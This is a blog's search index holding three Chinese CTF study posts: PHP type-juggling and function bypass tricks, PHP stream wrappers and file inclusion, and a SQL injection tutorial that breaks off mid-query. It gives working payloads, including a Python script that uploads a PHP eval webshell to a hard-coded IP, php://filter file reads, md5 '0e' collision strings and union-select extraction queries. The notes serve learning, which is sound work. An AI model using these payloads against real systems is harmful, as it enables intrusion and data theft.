<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP特性</title>
      <link href="/2025/04/20/php-te-xing/"/>
      <url>/2025/04/20/php-te-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h2><h4 id="自动-强制-类型转换"><a href="#自动-强制-类型转换" class="headerlink" title="自动 &#x2F; 强制 类型转换"></a>自动 &#x2F; 强制 类型转换</h4><p><strong>语言特性</strong>：PHP 是一个弱类型语言, 变量之间进行比较时, 若两个变量类型不一致, 会先进行强制类型转换，然后再进行比较。</p><p>规则如下：</p><ul><li>非数字开头的字符串转换成 int 类型时会变成 0, 数字开头的字符串转换 int 类型后会保留开头的数字</li><li>一个十进制数与十六进制 &#x2F; 八进制数比较时, PHP 会将十六进制 &#x2F; 八进制数转换为十进制数</li><li>string 类型的转换会从最左边开始, 直到遇到非数字的字符时停止</li><li>含 e 的字符串转换成 int 类型时会被当做科学计数法处理, <code>123e456</code> 表示 123 的 456 次方</li><li><code>0e123</code> 表示 0 的 123 次方, 总是等于 0 <code>0e456</code> 同理</li><li>在数字开头加入 <code>\f \t \s \n \r</code> 等同样返回 true</li></ul><h4 id="强弱类型比较"><a href="#强弱类型比较" class="headerlink" title="强弱类型比较"></a>强弱类型比较</h4><p><strong>&#x3D;&#x3D;</strong> 弱类型比较, 仅要求两边变量类型转换后的值相等</p><p><strong>&#x3D;&#x3D;&#x3D;</strong> 强类型比较, 不仅要求两个变量的值相等, 还要求变量的类型相同</p><p>同理 <strong>!&#x3D;</strong> 是弱类型比较, 而 <strong>!&#x3D;&#x3D;</strong> 是强类型比较</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">&#x27;123&#x27; == 123 // true &#x27;123&#x27; === 123 // false</code></pre><p><img src="image-20250414215823672.png" alt="image-20250414215823672"></p><p><img src="image-20250414215903794.png" alt="image-20250414215903794"></p><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><p>基于获取变量的整数值函数的绕过</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">intval(mixed $value, int $base = 10): int# eg:intval(&#x27;0337522&#x27;, 0); # 八进制intval(&#x27;0x1bf52&#x27;, 0); # 十六进制# -> 114514</code></pre><p>当 <code>$base = 0</code> 时, 通过检测 var（$value） 的格式来决定使用的进制：</p><ul><li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li><li>如果字符串以 “0b” (或 “0B”) 开头，使用 2 进制 (binary)；否则，</li><li>如果字符串以 “0” 开始，使用 8 进制 (octal)；否则，</li><li>将使用 10 进制 (decimal)。</li></ul><p>另：intval 可以取整 (去除小数点后的部分) 和截断 (去除数字后的字符串, 包括科学计数法)</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">intval(&#x27;114514.0&#x27;);intval(&#x27;114514.1&#x27;);intval(&#x27;114514a&#x27;);intval(&#x27;114514e123&#x27;);# -> 114514</code></pre><p>eg:</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==="4476")&#123;        die("no no no!");    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;</code></pre><p>解法</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">八进制表示法：?num=010574010574 是八进制，转换为十进制是 4476字符串 "010574" 不等于 "4476"十六进制表示法：?num=0x117c0x117c 是十六进制，转换为十进制是 4476字符串 "0x117c" 不等于 "4476"科学计数法：?num=4476e04476e0 转换为整数是 4476字符串 "4476e0" 不等于 "4476"前导空格/特殊字符：?num=4476%20字符串 "4476 " 不等于 "4476"intval() 会忽略后面的空格</code></pre><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><p>正则函数缺陷 </p><h4 id="单行-多行匹配"><a href="#单行-多行匹配" class="headerlink" title="单行 &#x2F; 多行匹配"></a>单行 &#x2F; 多行匹配</h4><p>(URL编码的 <code>%0A</code> 是换行符 <code>\n</code>)</p><p>在正则表达式中，<code>$</code> 是一个特殊字符（锚字符），用于匹配字符串的结尾位置。</p><p>在多行模式下，<code>$</code> 不仅匹配整个字符串的结尾，还匹配每行的结尾（即 <code>\n</code> 或 <code>\r</code> 之前的位置）。</p><p>如果要匹配实际的 <code>$</code> 字符（而不是作为特殊字符），需要使用转义：$</p><h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><pre class=" language-highlight plaintext"><code class="language-highlight plaintext"># ctfshow-web89 正则缺陷# 利用数组绕过正则匹配，使其返回值发生错误而为false : ?num[]=1if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(preg_match("/[0-9]/", $num))&#123;        die("no no no!");    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;</code></pre><h4 id="正则回溯（没懂）"><a href="#正则回溯（没懂）" class="headerlink" title="正则回溯（没懂）"></a>正则回溯（没懂）</h4><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限</p><p>如何绕过呢，让回溯次数超过最大限制就可以使preg_match()函数返回false，从而绕过限制，中文的回溯次数在100万次就好崩溃，这个回溯保护使PHP为了防止关于正则表达式的DDOS<br>payload:<br>GET:</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">import requestsfrom io import BytesIOpayload =BytesIO(b&#x27;[]&#x27;+b&#x27;a&#x27;*1000000)res = requests.get(&#x27;[]?[]=&#x27;+str(payload))print(res.text)</code></pre><p>POST:</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">import requestsfrom io import BytesIOfiles = &#123;  &#x27;file&#x27;: BytesIO(b&#x27;aaa<?php eval($_POST[txt]);//&#x27; + b&#x27;a&#x27; * 1000000)&#125;res = requests.post(&#x27;http://51.158.75.42:8088/index.php&#x27;, files=files, allow_redirects=False)print(res.headers)</code></pre><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a><strong>strpos()</strong></h2><p><strong>strpos — 查找字符串首次出现的位置</strong></p><p><strong><code>strpos(&#39;01234&#39;, 0)</code> 返回的结果是 0 对应的索引 0, 也就是 false</strong></p><p><strong>如果是 <code>!strpos()</code> 这种则会返回 true</strong></p><p><strong>代码使用了 <code>if(!strpos($str, 0))</code> 对八进制进行过滤, 可以在字符串开头加空格绕过</strong></p><p><strong>strpos() 遇到数组返回 null</strong></p><p><strong>strrpos() stripos() strripos() 同理</strong></p><p><strong><img src="image-20250415204317350.png" alt="image-20250415204317350"></strong></p><h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a><strong>is_numeric()</strong></h2><p><strong>数字或数字字符串检查函数</strong></p><p><strong>特性：</strong></p><ul><li><strong>可识别科学计数法，如：<code>0123e4567</code> 返回 true</strong></li><li><strong>包含非 e 字母返回 false</strong></li><li><strong>在数字  开头  加入空格 换行符 tab 等特殊字符可以绕过检测</strong></li><li><strong>可以尝试利用 base64 + bin2hex 找到一些只含 e 和数字的 payload</strong></li></ul><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">is_numeric(&#x27; 36&#x27;); // trueis_numeric(&#x27;36 &#x27;); // falseis_numeric(&#x27;3 6&#x27;); // falseis_numeric("\n36"); // trueis_numeric("\t36"); // trueis_numeric("36\n"); // falseis_numeric("36\t"); // false</code></pre><p><strong><img src="image-20250415210640094.png" alt="image-20250415210640094"></strong></p><h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a><strong>in_array()</strong></h2><p><strong>is_array() 可以「检测」变量是不是「数组」类型。</strong></p><p><strong>由于 PHP 自动 &#x2F; 强制 类型转换的特性，会将待搜索的值的类型自动转换为数组中的值的类型。</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">var_dump(in_array(&#x27;1abc&#x27;, [1,2,3,4,5])); // truevar_dump(in_array(&#x27;abc&#x27;, [1,2,3,4,5])); // falsevar_dump(in_array(&#x27;abc&#x27;, [0,1,2,3,4,5])); // true</code></pre><p><strong>注意： is_array() 函数只能判断「普通数组」，不能判断关联数组或多维数组。</strong></p><p><strong>is_array() 只关心变量的「类型」，而不关心里面的「值」；即使里面没有值，也会返回true。</strong></p><p><strong>is_array() 一次只能判断「一个」变量，如果传入多个变量，会报Warning，并且执行结果也不正确。</strong></p><h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a><strong>ereg()</strong></h2><p><strong>ereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。</strong></p><p><strong>.ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</strong></p><p><strong>这里ereg有两个漏洞：</strong> </p><p>  <strong>①%00截断及遇到%00则默认为字符串的结束</strong></p><p>  <strong>②当ntf为数组时它的返回值不是FALSE</strong></p><h2 id="trim-¶"><a href="#trim-¶" class="headerlink" title="trim()¶"></a><strong>trim()<a href="https://hello-ctf.com/hc-tags/web/PHP_features/#trim">¶</a></strong></h2><p><strong>不过滤 \f 换页符, url 编码后是 <code>%0c36</code></strong></p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a><strong>变量覆盖</strong></h2><p><strong>几种形式</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$$key = $$value;extract()parse_str()import_request_variables()</code></pre><p><strong>思路是 <code>$_GET</code> <code>$_POST</code> <code>$_COOKIKE</code> 相互转换</strong></p><p><strong>或者利用 <code>$GLOBALS</code> 输出所有的全局变量</strong></p><p><strong>另外</strong></p><p><strong>parse_str() 函数把查询字符串解析到变量中。</strong></p><p><strong>注释：如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</strong></p><p> <strong>即parse_str() 接受数组传参 支持数组内变量覆盖</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?_POST[key1]=36d&_POST[key2]=36d</code></pre><p> <strong>import_request_variables()</strong></p><p><strong>将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 <a href="https://www.php.net/manual/zh/ini.core.php#ini.register-globals">register_globals</a>，但又想用到一些全局变量，那么此函数就很有用。</strong></p><h2 id="路径穿越"><a href="#路径穿越" class="headerlink" title="路径穿越"></a><strong>路径穿越</strong></h2><p><strong>通过绝对路径 &#x2F; 相对路径绕过正则对文件名的检测, 例如 <code>preg_match(&#39;/flag.php/&#39;, $str)</code></strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./flag.php./ctfshow/../flag.php/var/www/html/flag.php</code></pre><p><strong>利用 Linux 下的软链接绕过</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></pre><p><strong>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经<code>require_once(&#39;flag.php&#39;)</code>，已经include的文件不可以再require_once。</strong></p><p><strong>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php//result PD9waHAKCiRmbGFnPSJ0ZXN0e30iOwo=</code></pre><h2 id="哈希字符串"><a href="#哈希字符串" class="headerlink" title="哈希字符串"></a><strong>哈希字符串</strong></h2><h3 id="0e-bypass"><a href="#0e-bypass" class="headerlink" title="0e bypass"></a><strong>0e bypass</strong></h3><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$_GET[&#x27;name&#x27;] != $_GET[&#x27;password&#x27;]MD5($_GET[&#x27;name&#x27;]) == MD5($_GET[&#x27;password&#x27;])</code></pre><p><strong>PHP 在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为 0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么 PHP 将会认为他们相同，都是 0。</strong></p><p><strong>这一点在 md5() &#x2F; sha1() 都适用，以下是可用的 payload：</strong></p><h4 id="md5-0e-payload"><a href="#md5-0e-payload" class="headerlink" title="md5 0e payload"></a><strong>md5 0e payload</strong></h4><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">QNKCDZO240610708 s878926199a s155964671a s214587387a</code></pre><h4 id="sha1-0e-payload"><a href="#sha1-0e-payload" class="headerlink" title="sha1 0e payload"></a><strong>sha1 0e payload</strong></h4><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">```sha1 0e payload# sha1 0e payloadaaroZmOkaaK1STfYaaO8zKZFaa3OFF9m0e129063370410932435112</code></pre><h3 id="Array-bypass"><a href="#Array-bypass" class="headerlink" title="Array bypass"></a><strong>Array bypass</strong></h3><p><strong>md5 加密数组时返回 null</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$a = Array();$b = Array();md5($a) == md5($b); // null == null truemd5($a) === md5($b); // null === null true</code></pre><p><strong>sha1 同理</strong></p><h4 id="哈希碰撞"><a href="#哈希碰撞" class="headerlink" title="哈希碰撞"></a><strong>哈希碰撞</strong></h4><p><strong>eg:</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext"># ctfshow - web97if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;    if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])        if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))            echo $flag;    else        print &#x27;Wrong.&#x27;;&#125;# a[]=1&b[]=2 -> 弱类型比较可以直接数组绕过，其结果都会转换为null</code></pre><p><strong>如果进行了 string 强制转类型后，则不再接受数组，以下为弱碰撞：</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$a=(string)$a;$b=(string)$b;if(  ($a!==$b) && (md5($a)==md5($b)) )&#123;    echo $flag;&#125;# a=QNKCDZO&b=240610708</code></pre><p><strong>强碰撞则不为特性，这时需要找到两个真正的 md5 值相同数据：</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$a=(string)$a;$b=(string)$b;if(  ($a!==$b) && (md5($a)===md5($b)) )&#123;    echo $flag;&#125;# 使用使用 fastcoll / hashclash 工具进行md5碰撞生成相同md5但不通变量值的内容</code></pre><h2 id="扩"><a href="#扩" class="headerlink" title="扩"></a><strong>扩</strong></h2><h3 id="函数与数字运算"><a href="#函数与数字运算" class="headerlink" title="函数与数字运算"></a><strong>函数与数字运算</strong></h3><p><strong>在 PHP 中, 函数与数字进行运算的时候, 函数能够被正常执行</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">1+phpinfo()+1;</code></pre><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">+ - * / & |` 都行, 另外还有 `&& ||</code></pre><h3 id="三目运算符构造语句"><a href="#三目运算符构造语句" class="headerlink" title="三目运算符构造语句"></a><strong>三目运算符构造语句</strong></h3><p><strong>有时候构造不带分号 payload 时需要用到三目运算符</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">return 1 ? phpinfo():1;(<条件> ? 参数_1 : 参数_2)</code></pre><p><strong>1 永远为 true, 于是正常执行 phpinfo</strong></p><h3 id="根命名空间-绕过过滤"><a href="#根命名空间-绕过过滤" class="headerlink" title="根命名空间 绕过过滤"></a><strong>根命名空间 绕过过滤</strong></h3><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">PHP 的命名空间默认为 \, 所有的函数和类都在 \ 这个命名空间中, 如果直接写函数名 function_name() 调用, 调用的时候其实相当于写了一个相对路径; 而如果写 \function_name() 这样调用函数. 则其实是写了一个绝对路径. 如果你在其他 namespace 里调用系统类, 就必须写绝对路径这种写法.</code></pre><p><strong>有时候可以绕过一些正则, 比如执行的代码不允许以字母开头</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">\phpinfo();</code></pre><h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext()"></a><strong>gettext()</strong></h3><p><strong>不含字母数字的函数:<code>_()</code> 为 gettext() 别名, 类似于 echo 输出。</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">var_dump(call_user_func(call_user_func("_", "get_defined_vars")));</code></pre><p><strong>以上命令可以返回所有已定义变量</strong></p><h3 id="GLOBALS-和-get-defined-vars"><a href="#GLOBALS-和-get-defined-vars" class="headerlink" title="$GLOBALS 和 get_defined_vars()"></a><strong>$GLOBALS 和 get_defined_vars()</strong></h3><p><strong><code>$GLOBALS</code> 引用全局作用域中可用的全部变量</strong></p><p><strong>get_defined_vars() 返回由所有已定义变量所组成的数组</strong></p><p><strong>有时候可以从这里面查看 <code>$flag</code></strong></p><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a><strong>伪协议</strong></h3><p><strong>常见的 php:&#x2F;&#x2F;filter php:&#x2F;&#x2F;input data:&#x2F;&#x2F; 都很熟悉了</strong></p><p><strong>下面是一些不是很常见的 payload</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">compress.zlib://flag.phpphp://filter/ctfshow/resource=flag.php</code></pre><p><strong>php:&#x2F;&#x2F;filter 遇到不存在的过滤器会直接跳过, 可以绕过一些对关键字的检测</strong></p><h3 id="无参数函数读文件-RCE"><a href="#无参数函数读文件-RCE" class="headerlink" title="无参数函数读文件 &#x2F;RCE"></a><strong>无参数函数读文件 &#x2F;RCE</strong></h3><p><strong>无参数函数指形如 <code>a(b(c()))</code> 这种不需要参数或者只需要一个参数, 并且对应的参数可以通过另一个函数的返回值来获取的函数</strong></p><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a><strong>create_function()</strong></h3><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">create_function(string $args, string $code): string</code></pre><p><strong>create_function(string $args, string $code): string</strong></p><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a><strong>call_user_func()</strong></h3><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">call_user_func(callable $callback, mixed ...$args): mixed</code></pre><h3 id="原生类列目录-RCE"><a href="#原生类列目录-RCE" class="headerlink" title="原生类列目录 &#x2F;RCE"></a><strong>原生类列目录 &#x2F;RCE</strong></h3><p><strong>一般都是 <code>echo new $v1($v2(&#39;xxx&#39;))</code> 或者 <code>eval($v(&#39;ctfshow&#39;))</code> 的形式, 有时候可以跳出来执行其它代码</strong></p><p><strong>ReflectionClass 和 Exception 里面可以执行其它函数</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">new Exception(system(&#x27;xx&#x27;))new ReflectionClass(system(&#x27;xx&#x27;))new FilesystemIterator(getcwd())new ReflectionClass(&#x27;stdClass&#x27;);system()//</code></pre><p><strong>##</strong> </p><h3 id="属性类型不敏感"><a href="#属性类型不敏感" class="headerlink" title="属性类型不敏感"></a><strong>属性类型不敏感</strong></h3><p><strong>在 PHP 7.1 + 的版本中, 对属性类型 (public protected private) 不敏感。</strong></p><p><strong>因为 protected 和 private 反序列化后的结果中含有 <code>%00</code>, 部分题目会禁止这种字符, 可在构造 payload 时将属性全部改成 public 来绕过限制。</strong></p><h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a><strong>session.upload_progress</strong></h3><p><strong>该机制中的缓存可被文件包含和反序列化恶意利用。</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/2025/03/25/php-wei-xie-yi/"/>
      <url>/2025/03/25/php-wei-xie-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验<strong>被绕过</strong>，就会导致文件包含漏洞。</p><h2 id="包含漏洞分类"><a href="#包含漏洞分类" class="headerlink" title="包含漏洞分类"></a>包含漏洞分类</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>当包含的文件在服务器本地时，就形成了本地文件包含。文件包含可以包含任意文件，被包含的文件可以不是 PHP 代码，可以是文本或图片等。只要文件被包含就会被服务器脚本语言执行，如果包含的文件内容<strong>不符合</strong> php 语法，会直接将文件内容输出。</p><h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>当包含的文件在远程服务器上时，就形成了远程文件包含。所包含远程服务器的文件后缀<strong>不能</strong>与目标服务器语言相同，远程文件包含需要在 php.ini 中设置：</p><pre class=" language-highlight ini">Copy <span class="attr">Highlighter-hljsallow_url_include</span> = <span class="literal"><code class="language-highlight ini">Copy <span class="attr">Highlighter-hljsallow_url_include</span> = <span class="literal">on</span>（是否允许 include/require 远程文件）<span class="attr">allow_url_fopen</span> = <span class="literal">on</span>（是否允许打开远程文件）</code></pre><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h2 id="PHP-伪协议"><a href="#PHP-伪协议" class="headerlink" title="PHP 伪协议"></a>PHP 伪协议</h2><p><strong>PHP 伪协议</strong>是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下。</p><table><thead><tr><th>伪协议</th><th>功能</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>访问本地文件系统</td></tr><tr><td>http:&#x2F;&#x2F;</td><td>访问 HTTP(s) 网址</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>访问各个输入&#x2F;输出流</td></tr><tr><td>phar:&#x2F;&#x2F;</td><td>PHP 归档</td></tr><tr><td>zip:&#x2F;&#x2F;</td><td>压缩流</td></tr></tbody></table><pre class=" language-highlight bash"><code class="language-highlight bash">?file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><p>稍微解释下这个做法，<strong>php:&#x2F;&#x2F;filter&#x2F;</strong> 是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F; 表示读取的方式是 base64 编码后，convert.base64-encode是一种过滤器，resource&#x3D;index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。<br>php 协议还常用 <strong>php:&#x2F;&#x2F;input</strong>，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。</p><h2 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data 伪协议"></a>data 伪协议</h2><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p><pre class=" language-highlight scss">Copy Highlighter-hljsdata://text/plain;base64,<span class="built_in"><code class="language-highlight scss">Copy Highlighter-hljsdata://text/plain;base64,<span class="built_in">xxxx</span>(base64编码后的数据)</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2025/01/29/sql/"/>
      <url>/2025/01/29/sql/</url>
      
        <content type="html"><![CDATA[<h2 id="一、判断注入类型"><a href="#一、判断注入类型" class="headerlink" title="一、判断注入类型"></a>一、判断注入类型</h2><h3 id="按照注入点类型分类"><a href="#按照注入点类型分类" class="headerlink" title="按照注入点类型分类"></a>按照注入点类型分类</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>​        SQL中的语句格式：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where id =x</code></pre><pre><code>    判断方法：使用 1 and 1=1  ，1 and 1=2 来判断    当输入：and 1=1 时页面显示正常                   select * from users where id =x and 1=1        输入：and 1=2 时页面显示异常                   select * from users where id =x and 1=2       说明是数字型注入</code></pre><h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>​        SQL中的语句格式：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where id =&#x27;x&#x27;</code></pre><pre><code>    判断方法：使用 1&#39; and &#39;1&#39;=&#39;1  ，1&#39; and &#39;1&#39;=&#39;2 来判断    当输入：1’ and ‘1’=&#39;1 时页面显示正常                   select * from users where id =&#39;x&#39; and &#39;1&#39;=&#39;1&#39;       输入：1’ and ‘1’=&#39;2 时页面显示异常                  select * from users where id =&#39;x&#39; and &#39;1&#39;=&#39;2&#39;      说明是字符型注入</code></pre><h4 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h4><p>​        基于搜索框的注入</p><p>​    SQL中的语句格式：select * from database.table where users like ‘%要查询的关键字%’</p><p>   判断方法：</p><p>​     某个商品名称%’ and 1&#x3D;1 and ‘%’&#x3D;’  （这个语句的功能就相当于普通SQL注入的 and 1&#x3D;1）</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from database.table where users like &#x27;%某个商品名称%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;%&#x27;</code></pre><p>​    页面显示正常</p><p>​     某个商品名称%’ and 1&#x3D;2 and ‘%’&#x3D;’  （这个语句的功能就相当于普通SQL注入的 and 1&#x3D;2）</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from database.table where users like &#x27;%某个商品名称%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;%&#x27;</code></pre><p>​    页面显示异常</p><p>​    根据上面的返回情况来判断是否存在搜索型注入</p><h2 id="二、联合注入"><a href="#二、联合注入" class="headerlink" title="二、联合注入"></a>二、联合注入</h2><h6 id="查找注入点"><a href="#查找注入点" class="headerlink" title="查找注入点"></a>查找注入点</h6><p>​        语句：1’ or 1 &#x3D; 1#    (这条万能语句常用于登录框之类的注入)</p><p>​    作用：是爆出表中的所有字段</p><p>​    举例：验证用户名和密码的语句</p><p>​    【在地址栏中的注释符可以用：–+】</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$sql="select * from users where username=&#x27;$name&#x27; and password=&#x27;$pwd&#x27;";</code></pre><p>​    当存在SQL注入，我们在密码出输入 1’ or 1 &#x3D; 1# 后，整条语句变成</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$sql="select * from users where username=&#x27;1&#x27; or 1 = 1#&#x27; and password=&#x27;$pwd&#x27;";</code></pre><p>​    # 是注释符号，后面的内容被注释掉，or 是或，作用两边有一边为真，结果就为真，因为右边的 1&#x3D;1 为真，所以上述语句等价于</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users where username=&#x27;1&#x27; or 1 = 1</code></pre><p>​    即使用户名不存在也没关系，1&#x3D;1 为 true，等价于</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">select * from users</code></pre><p>​    所以该语句的作用是爆破出所有字段</p><h6 id="查询字段数"><a href="#查询字段数" class="headerlink" title="查询字段数"></a>查询字段数</h6><p>​    </p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">语句：1&#x27;  order by 数值#</code></pre><h6 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h6><p>order by 判断字段数的目的就是为这一步做准备，如果只有 2 个字段，那union select 1,2# 才是正确的，写成 union select 1,2,3# 就错了，字段数只有两个没有三个</p><pre><code>    语句：-1’ union select 1,2,3#</code></pre><h6 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h6><p>​        关键：database()</p><pre><code>    根据回显位，在回显位输入所要内容对应的关键字。（例如回显位是 2）    语句：-1&#39; union select 1,database(),3#</code></pre><h6 id="爆破表格名"><a href="#爆破表格名" class="headerlink" title="爆破表格名"></a>爆破表格名</h6><p>​        </p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">关键：group_concat(table_name) from information_schema.tables where table_schema=database()</code></pre><pre><code>    和爆破数据库名一样的思路    语句：-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(),3#</code></pre><p>【注意：如果 information_schema 被过滤了，可以使用 sys】</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">1&&substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),1,1)=&#x27;f&#x27;</code></pre><h6 id="爆破表格字段"><a href="#爆破表格字段" class="headerlink" title="爆破表格字段"></a>爆破表格字段</h6><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">关键：group_concat(column_name) from information_schema.columns where table_name=&#x27;表格名&#x27;</code></pre><pre><code>    语句：-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;表格名&#39;,3#</code></pre><h6 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h6><h6 id><a href="#" class="headerlink" title></a></h6><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">关键：group_concat(id,username,password) from geekuser</code></pre><pre><code>    语句：-1&#39; union select 